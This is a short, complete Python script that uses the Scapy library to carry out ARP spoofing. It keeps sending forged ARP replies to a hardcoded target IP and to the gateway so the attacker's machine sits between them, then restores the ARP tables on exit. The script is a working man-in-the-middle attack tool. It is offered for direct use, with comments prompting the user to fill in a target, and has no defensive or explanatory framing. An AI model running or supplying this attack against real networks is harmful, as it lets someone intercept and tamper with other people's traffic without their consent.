from scapy.all import *

def get_mac(ip):
    a = sr1(ARP(pdst=ip))
    return a[ARP].hwsrc


def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, verbose=False)


target_ip = "192.168.230.239"  # Enter your target IP
gateway_ip = "192.168.230.35"  # Enter your gateway's IP

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)

except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] Arp Spoof Stopped")

'''restore(gateway_ip, target_ip)
restore(target_ip, gateway_ip)'''